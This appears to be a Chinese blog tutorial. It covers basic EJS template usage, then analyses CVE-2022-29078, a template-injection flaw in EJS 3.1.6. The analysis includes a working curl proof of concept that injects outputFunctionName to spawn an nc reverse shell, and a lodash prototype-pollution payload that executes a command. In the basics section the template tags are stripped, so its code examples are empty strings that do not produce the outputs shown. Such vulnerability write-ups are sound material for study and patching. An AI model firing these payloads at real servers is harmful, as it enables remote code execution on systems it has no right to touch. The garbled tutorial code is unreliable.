## Ejs简介：
EJS是一个javascript模板库，用来从json数据中生成HTML字符串
  * 功能：缓存功能，能够缓存好的HTML模板；
  * 用来执行javascript代码
  * 安装：
    $ npm install ejs
## 基础用法：
### 标签：
所有使用 `` 括起来的内容都会被编译成 Javascript，可以在模版文件中像写js一样Coding
    //test.ejs
    //test.js
    var ejs = require('ejs');
    var fs = require('fs');
    var data = fs.readFileSync('test.ejs');
    var result = ejs.render(data.toString());
    console.log(result);
    //123
或
    var ejs = require('ejs');
    var result = ejs.render('');
    console.log(result);
    //123
### 插值语句：
     if else 语句
          html代码
实例：
         危险区域, 请勿进入
        警告, 你即将进入危险区域
        状态安全
### 循环语句：
    { %>
           html代码
实例：
### 渲染页面：
`ejs.compile(str,[option])`
编译字符串得到模板函数，参数如下
    str：需要解析的字符串模板
    option：配置选项
    var template = ejs.compile('');
    var result = template();
    console.log(result);
    //123
`ejs.render(str,data,[option])`
直接渲染字符串并生成html，参数如下
    str：需要解析的字符串模板
    data：数据
    option：配置选项
    var result = ejs.render('');
    console.log(result);
    //123
### 变量：
用``输出变量，变量若包含 `'' '&'`等字符会被转义
    var ejs = require('ejs');
    var result = ejs.render('',{a:'123'});
    console.log(result);
    //&lt;div&gt;123&lt;/div&gt;
如果不希望变量值的内容被转义，那就这么用``输出变量
    var ejs = require('ejs');
    var result = ejs.render('',{a:'123'});
    console.log(result);
    //123
### 注释:
用``来注释，不执行不输出
### 文件包含：
`include`可以引用绝对路径或相对路径的模板文件
    //test.ejs
    //test.js
    var ejs = require('ejs');var result = ejs.render('');
    //throw new Error('`include` use relative path requires the \'filename\' option.');
    console.log(result);
由上面的提示可知，使用相对路径时，必须设置`'filename'`选项
    //test.ejs
    //test.js
    var ejs = require('ejs');var result = ejs.render('',{filename:'test.ejs'});
    console.log(result);
    //123
## CVE-2022-29078：
### SSTI分析方式：
NodeJS 的 EJS（嵌入式 JavaScript 模板）版本 3.1.6 或更早版本中存在 SSTI（服务器端模板注入）漏洞。
该漏洞`settings[view options][outputFunctionName]`在EJS渲染成HTML时，用浅拷贝覆盖值，最后插入OS
Command导致RCE。
复现：
#### 环境搭建：
    npm install ejs@3.1.6
    npm install express
#### app.js:
    const express = require('express');
    const app = express();
    const PORT = 3000;
    app.set('views', __dirname);
    app.set('view engine', 'ejs');
    app.get('/', (req, res) => {
        res.render('index', req.query);
    });
    app.listen(PORT, ()=> {
        console.log(`Server is running on ${PORT}`);
    });
#### index.ejs:
            Lab CVE-2022-29078
            CVE-2022-29078
#### 漏洞代码：
如果先看`index.ejs`代码，可以看到req.query`是这样传递的。我们查看 Node_Modules 的 ejs/lib/ejs.js
文件，我们可以看到以下代码部分。
    /**
     * Render an EJS file at the given `path` and callback `cb(err, str)`.
     *
     * If you would like to include options but not data, you need to explicitly
     * call this function with `data` being an empty object or `null`.
     *
     * @param {String}             path     path to the EJS file
     * @param {Object}            [data={}] template data
     * @param {Options}           [opts={}] compilation and rendering options
     * @param {RenderFileCallback} cb callback
     * @public
     */
    exports.renderFile = function () {
      var args = Array.prototype.slice.call(arguments);
      var filename = args.shift();
      var cb;
      var opts = {filename: filename};
      var data;
      var viewOpts;
      // Do we have a callback?
      if (typeof arguments[arguments.length - 1] == 'function') {
        cb = args.pop();
      }
      // Do we have data/opts?
      if (args.length) {
        // Should always have data obj
        data = args.shift();
        // Normal passed opts (data obj + opts obj)
        if (args.length) {
          // Use shallowCopy so we don't pollute passed in opts obj with new vals
          utils.shallowCopy(opts, args.pop());
        }
        // Special casing for Express (settings + opts-in-data)
        else {
          // Express 3 and 4
          if (data.settings) {
            // Pull a few things from known locations
            if (data.settings.views) {
              opts.views = data.settings.views;
            }
            if (data.settings['view cache']) {
              opts.cache = true;
            }
            // Undocumented after Express 2, but still usable, esp. for
            // items that are unsafe to be passed along with data, like `root`
            viewOpts = data.settings['view options'];
            if (viewOpts) {
              utils.shallowCopy(opts, viewOpts);
            }
          }
          // Express 2 and lower, values set in app.locals, or people who just
          // want to pass options in their data. NOTE: These values will override
          // anything previously set in settings  or settings['view options']
          utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);
        }
        opts.filename = filename;
      }
      else {
        data = {};
      }
      return tryHandleCache(opts, data, cb);
    };
如果你仔细看上面的代码，你会发现下面的代码部分是独一无二的。
    ...
    if (args.length) {
        // Should always have data obj
        data = args.shift();
        // Normal passed opts (data obj + opts obj)
        if (args.length) {
          // Use shallowCopy so we don't pollute passed in opts obj with new vals
          utils.shallowCopy(opts, args.pop());
        }
    ...
`data=args.shift()`可以查看是否输入了该值`curl
"127.0.0.1:3000?test=AAAA"`，如果发送curl请求，通过debug试一下，`data`可以检查用户输入的参数`test`和值是否在里面输入。`AAAA`
然后我们继续往下面看：
    ...
    viewOpts = data.settings['view options'];
        if (viewOpts) {
            utils.shallowCopy(opts, viewOpts);
        }
    ...
因为这个位置data是test传入的内容，所以data我们间接可控，所以我们可以强行插入`setting['view options']`来设置
  * `curl "127.0.0.1:3000?test=AAAA&settings\[view%20options\]\[A\]=BBBB"`
所以我们来跟进shallowCopy函数：
    exports.shallowCopy = function (to, from) {
      from = from || {};
      for (var p in from) {
        to[p] = from[p];
      }
      return to;
    };
取出第二个输入自变量的元素，并将使用该元素的数组的值存储在具有与第一个自变量相同的元素的数组中，有点像merge函数。这里面的两个参数to就是opts，from就是我们能够控制的viewOpts，这让就将里面的A：BBBB给了opts
从图中可以看出，的值存储`to['A']`在
中。`BBBB`也就是说，用户可以操纵第一个参数。调用的变量在本文中`opts`作为第一个参数传递，`opts`稍后在以下函数中使用该变量。
    if (!this.source) {
          this.generateSource();
          prepended +=
            '  var __output = "";\n' +
            '  function __append(s) { if (s !== undefined && s !== null) __output += s }\n';
          if (opts.outputFunctionName) {
            prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
          }
          if (opts.destructuredLocals && opts.destructuredLocals.length) {
    ...
从代码中可以看出，`opts`将`outputFunctionName`的元素值取出`prepended`并放入
中，对应的值后面作为连接其他值的代码执行。由于用户`opts`可以操纵 ，`outputFunctionName`所以值也可以被调制，并且可以通过 RCE
生成想要的值。
`curl
"127.0.0.1:3000?test=AAAA&settings\[view%20options\]\[outputFunctionName\]=x;console.log('Hacked');x"`
所以我们最后的POC就是：
    curl "127.0.0.1:3000?test=AAAA&settings\[view%20options\]\[outputFunctionName\]=x;process.mainModule.require('child_process').execSync('nc%20127.0.0.1%208862%20-e%20sh');x"
### 原型链污染分析方式：
我们来调试一下这个ejs来看一下利用方式：
#### Ejs.js：
    var express = require('express');
    var lodash = require('lodash');
    var ejs = require('ejs');
    var app = express();
    //设置模板的位置与种类
    app.set('views', __dirname);
    app.set('views engine','ejs');
    //对原型进行污染
    var malicious_payload = '{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require(\'child_process\').exec(\'calc\');var __tmp2"}}';
    lodash.merge({}, JSON.parse(malicious_payload));
    //进行渲染
    app.get('/', function (req, res) {
        res.render ("index.ejs",{
            message: 'Ic4_F1ame'
        });
    });
    //设置http
    var server = app.listen(8000, function () {
        var host = server.address().address
        var port = server.address().port
        console.log("应用实例，访问地址为 http://%s:%s", host, port)
    });
#### index.ejs：